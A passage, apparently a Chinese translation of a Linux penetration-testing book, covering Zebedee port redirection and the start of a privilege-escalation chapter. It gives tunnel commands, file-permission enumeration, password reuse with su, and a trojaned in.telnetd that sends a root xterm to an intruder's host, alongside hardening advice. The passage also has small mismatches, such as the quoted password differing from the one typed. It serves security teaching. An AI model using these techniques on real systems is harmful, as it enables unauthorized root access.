
以下你可以采取的步骤，以增加入侵者获取远程 Shell 的难度：

- 配置防火墙阻止所有未使用的端口。此外，收紧防火墙规则以限制出站连接。例如，仅作为 Web 服务器的主机不得允许在任何端口上发起出站连接。
- 从生产主机卸载如 `telnet`、`ftp`、`wget` 和 `tfftp` 等客户端软件。
- 从生产主机卸载 X 程序和库。

# 端口重定向

端口重定向技术可绕过弱的防火墙规则，连接到运行在防火墙过滤端口上的服务。为了方便端口重定向，我们将使用 `Zebedee`，这是一种可以在 `http://www.winton.org.uk/zebedee` 获取的命令行工具。假设受害者机器上可用 `Zebedee`。如果没有，则使用早之前“上传 Netcat”部分中描述的方法将 `Zebedee` 二进制文件上传到受害者主机。

## 本地端口重定向

假设入侵者需要连接到已被攻主机上的 MySQL 服务器。如果被攻主机上或其之前有一个防火墙允许 `80` 端口的入站连接，入侵者可以在受害者机器上执行以下操作：

```
[victimhost]$ zebedee -T 80 -s 127.0.0.1:3306
```

接下来，入侵者可以在其机器上执行以下操作：

```
[intruder's_host]$ zebedee -T 80 victim's_ip_address 3306:127.0.0.1:3306
```

这将导致入侵者主机上的 `Zebedee` 进程连接到受害者主机 `80` 端口上的 `Zebedee` 进程。入侵者现在连接其主机的 `3306` 端口 (`127.0.0.1`)，从而通过 `Zebedee` 隧道连接到受害者主机的 `3306` 端口。

> 入侵者可以在受害者主机上运行 `ifconfig` 和 `route -n` 命令来识别额外的网卡……

# 第 5 章 权限提升

- 本章内容：
- 利用本地信任
- 组成员关系与错误的文件权限
- `PATH` 中的 `":"`
- 软件漏洞
- 总结

## 利用本地信任

任何漏洞都允许入侵者获得对远程主机的非特权访问。在获得普通用户权限后，入侵者的下一个逻辑步骤是获取 `root`（超级用户）权限。除了外部入侵者外，恶意用户也可能尝试利用本地漏洞来获取超级用户权限。

将权限提升到超级用户权限的行为通常被称为**权限提升**（`privilege escalation`）。本章描述了具有普通用户权限的个人尝试获取超级用户权限的各种方法。

在大多数情况下，防火墙被配置为限制来自外部主机和网络的访问。回环接口（`127.0.0.1`）上的流量通常是不受限制的。事实上，过滤回环接口上的流量可能会导致许多应用程序运行异常。本地用户可以利用这一条件为自己有利，尝试扫描、枚举和利用无法从远程访问的服务。因此，一旦攻击者获得了对主机的本地用户访问权限，他或她可能会尝试书中之前章节中描述的所有攻击技术来提升权限。

## 组成员关系与错误的文件权限

错误的文件权限可能允许恶意用户读取或写入他们没有访问权限的文件。以下章节描述了恶意用户如何利用错误的文件权限来提升其权限。

### 查找组拥有的文件

假设一个入侵者已经获得了本地账户“`joe`”的访问权限。他或她可以通过执行 `id` 命令发现“`joe`”所属的所有组：

```bash
[bash]$ id
uid=500(joe) gid=500(joe) groups=500(joe),501(proj1)
```

在注意到 "`joe`" 属于 "`proj1`" 组后，入侵者可以执行以下命令，该命令将列出所有属于 "`proj1`" 组的文件：

```bash
$bash$ find / -group proj1 -print 2> /dev/null
/var/proj1/main.c
/var/proj1/main.o
/var/proj1/README
/var/proj1/pass.txt
/var/log/proji
```

现在，入侵者确切知道“`joe`”可以访问哪些 "`proj1`" 文件。这些文件中的 `pass.txt` 看起来很有趣：

```bash
$bash$ more /var/proj1/pass.txt
注意，此程序使用系统密码 "r00t3rp455.w." 对 MySQL 数据库进行验证。
```

管理员经常重复使用密码。如果害者的 `root` 密码与上述注中显示的 MySQL 密码相同，入侵者可以通过执行以下命令获得 `root` 权限：

```bash
$bash$ su
Password:r00t3rp455
$bash# id
uid=0(root) gid=0(root) groups=0(root), 1(bin), 2(daemon), 3(sys), 4 (adm), 6(disk), 10(wheel)
```

### 查找 world可读和可写的文件

除了搜索 `world` 可读的文件外，还可能搜索用户可以访问的 `world` 可读文件。例如，以下是您搜索 `/etc` 目录下存在的所有世界可读文件：

```bash
$bash$ find /etc -type f -perm -4 -print 2> /dev/null
```

`/etc` 中的许多文件不应该是世界可读的。例如，`/etc/shadow` 文件包含用户加密后的密码。任何访问此文件的人都可以使用 `John the Ripper` 等工具通过暴力破解破解用户密码。

入侵者可以尝试通过执行以下命令搜索 `world` 可写的文件：

```bash
$bash$ find / -type f -perm -2 -print 2> /dev/null
/usr/sbin/in.telnetd
```

在这个示例中，入侵者的 “`joe`” 账户对 `in.telnetd` 有写权限。受害者主机上的 `inetd` 或 `xinetd` 服务会在每次向主机建立入站 `telnet` 连接时调用 `in.telnetd` 文件。入侵者可以编辑 `in.telnetd` 文件并向其中放入以下内容：

```bash
#!/bin/bash
xterm -display intruder’s_ip_address:0.0 &
```

现在，入侵者可以在其他或她的宿主机上执行以下操作：
`xhost +victim_s_ip_address`

这将允许受害者机器在入侵者的服务器上显示 X 程序。入侵者只需要连接到 `telnet` 主机，这将使 `inetd` 或 `xinetd` 以 `root` 权限调用 `/usr/sbin/in.telnetd`，从受害者主机调用一个 `root` `xterm` 并呈现给入侵者！

### 确保正确的权限

例行审核文件以确保正确的权限权限。

## `PATH` 中的 `":"`

当用户执行命令时，命令 `shell` 会在 `PATH` 环境变量中包含的目录列表中搜索该命令的位置：

```bash
[bash]$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/home/joe:/bin
```
